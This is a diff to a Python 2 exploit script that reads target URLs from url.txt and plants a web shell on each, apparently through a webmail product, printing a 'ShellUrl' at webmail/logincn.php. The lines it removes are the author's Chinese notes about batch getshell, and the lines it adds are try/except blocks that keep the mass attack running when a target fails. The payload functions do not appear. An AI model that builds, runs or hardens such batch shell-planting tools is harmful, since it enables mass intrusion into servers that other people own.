@@ -29,9 +29,7 @@ def getNormalUrl(url):
 	result = searchpath(url)
 	if not result:
 		url = 'http://'+url
-		pass
 	return url
-	pass
 
 #get web path
 def getWebPath(url):
@@ -120,20 +118,16 @@ if __name__ == '__main__':
 **                                                           2016.4.2   **
 **************************************************************************
 **************************************************************************
---------------------------------------------------------------------------
-1.这个exp有一些bug。但是大概能用.........我实在不想搞那些小bug了浪费时间.
-2.把url放入同一个文件夹下的url.txt中，就可以批量getshell了，过程中可能会
-直接蹦掉，你就要将那个导致蹦掉的url删了，再重新开始......
-3.有些虽然把shell地址打印出来了，但是可能是404，我也没有看原因了，因为我
-测试下来很少碰到所以也没有管了...
--------------------------------------------------------------------------
 	'''
 	print OUT
 	urltxt = open('url.txt', 'r')
 	for url in urltxt:
 		url = url.strip('\n')
-		webpath = getWebPath(url)
-		session = getSession(url)
+		try:
+			webpath = getWebPath(url)
+			session = getSession(url)
+		except Exception as e:
+			continue
 
 		if webpath == '' or session == '':
 			print getNowTime()+' [*]Error,Maybe It have not this leak,Please do it by yourself!'
@@ -141,5 +135,9 @@ if __name__ == '__main__':
 		elif len(webpath) == 5 and webpath != 'dmail' and webpath != 'cmail' and webpath != 'email' and webpath != 'fmail':
 			print getNowTime()+' [*]web path wrong,Please try again.'
 		else:
-			exp(url, session, webpath)
-			print getNowTime()+' [*]ShellUrl: '+getNormalUrl(url)+'/webmail/logincn.php'
+			try:
+				exp(url, session, webpath)
+				print getNowTime()+' [*]ShellUrl: '+getNormalUrl(url)+'/webmail/logincn.php'
+			except Exception as e:
+				pass
+
